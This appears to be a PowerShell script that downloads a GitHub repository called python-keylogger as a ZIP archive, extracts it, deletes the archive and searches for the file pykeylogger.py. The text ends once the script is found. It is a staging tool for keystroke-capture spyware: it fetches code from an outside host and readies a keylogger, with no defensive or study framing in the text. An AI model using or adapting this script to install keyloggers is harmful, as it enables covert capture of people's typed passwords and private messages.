# Determine script root
$scriptRoot = if ($PSScriptRoot) { $PSScriptRoot } else { (Get-Location).Path }

# ---------------------------
# Download & Extract Repo
# ---------------------------
$zipPath = Join-Path $scriptRoot "python-keylogger.zip"
$extractPath = Join-Path $scriptRoot "python-keylogger"

Write-Host "`nDownloading repo ZIP..."
Invoke-WebRequest "https://github.com/secureyourself7/python-keylogger/archive/refs/heads/master.zip" `
    -OutFile $zipPath

# Ensure clean extract folder
if (Test-Path $extractPath) {
    Remove-Item $extractPath -Recurse -Force
}

Expand-Archive $zipPath -DestinationPath $extractPath -Force
Remove-Item $zipPath -Force

Write-Host "Repo extracted to $extractPath"

# ---------------------------
# Detect actual extracted directory
# (GitHub always adds '-master' or branch name)
# ---------------------------
$repoRoot = Get-ChildItem -Path $extractPath -Directory | Select-Object -First 1

if (-not $repoRoot) {
    Write-Error "No extracted content found under $extractPath"
    exit
}

Write-Host "Detected repo root: $($repoRoot.FullName)"

# ---------------------------
# Locate target script inside repo (generic search)
# ---------------------------
$targetScriptName = "pykeylogger.py"

$targetScript = Get-ChildItem -Path $repoRoot.FullName -Filter $targetScriptName -Recurse |
                Select-Object -First 1

if (-not $targetScript) {
    Write-Error "Target script '$targetScriptName' not found."
    exit
}

Write-Host "Found script at: $($targetScript.FullName)"

